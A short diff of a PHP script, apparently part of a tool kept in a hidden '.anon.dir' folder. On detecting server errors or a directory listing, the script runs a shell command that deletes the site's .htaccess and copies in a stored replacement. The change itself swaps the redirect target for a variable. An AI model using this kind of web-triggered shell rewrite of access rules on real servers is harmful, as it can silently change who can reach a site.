@@ -157,7 +157,7 @@
     if(strpos($rs,'500 Internal Server Error')||strpos($rs,'503 Service Unavailable')||strpos($rs,'<title>Index of /</title>'))
     {$rs=bash("rm -f ./.htaccess && cp ./.anon.dir/Anon/base/access.cfg ./.htaccess"); sleep(1);};
 
-    header("Location: https://$hn");
+    header("Location: $tl");
 
     die();
 # -----------------------------------------------------------------------------------------------------------------------------
